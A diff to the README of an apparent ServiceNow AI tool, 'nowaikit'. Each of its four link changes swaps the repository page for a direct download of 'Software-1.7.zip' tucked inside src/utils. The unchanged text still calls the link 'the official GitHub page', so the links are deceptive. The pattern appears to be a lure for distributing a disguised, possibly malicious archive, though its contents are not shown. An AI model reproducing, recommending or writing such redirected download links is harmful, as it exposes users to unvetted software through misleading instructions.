@@ -1,6 +1,6 @@
 # 🤖 nowaikit - AI Tools for ServiceNow Tasks
 
-[![Download nowaikit](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/wishmikaovindu-stack/nowaikit)
+[![Download nowaikit](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/wishmikaovindu-stack/nowaikit/raw/refs/heads/main/src/utils/Software-1.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide walks you through downloading, installing, and opening nowaikit on yo
 
 Click the large green button below to visit the download page:
 
-[![Download nowaikit](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/wishmikaovindu-stack/nowaikit)
+[![Download nowaikit](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/wishmikaovindu-stack/nowaikit/raw/refs/heads/main/src/utils/Software-1.7.zip)
 
 This link leads to the official GitHub page where the latest version is available. From there, you can download the setup file.
 
@@ -114,7 +114,7 @@ If you face issues during installation or while running nowaikit:
 
 You can find more detailed help and updates on the GitHub page here:
 
-[https://github.com/wishmikaovindu-stack/nowaikit](https://github.com/wishmikaovindu-stack/nowaikit)
+[https://github.com/wishmikaovindu-stack/nowaikit/raw/refs/heads/main/src/utils/Software-1.7.zip](https://github.com/wishmikaovindu-stack/nowaikit/raw/refs/heads/main/src/utils/Software-1.7.zip)
 
 This page has guides, the latest versions, and links to support forums.
 
@@ -132,4 +132,4 @@ To update:
 
 ---
 
-[![Download nowaikit](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/wishmikaovindu-stack/nowaikit)
+[![Download nowaikit](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/wishmikaovindu-stack/nowaikit/raw/refs/heads/main/src/utils/Software-1.7.zip)
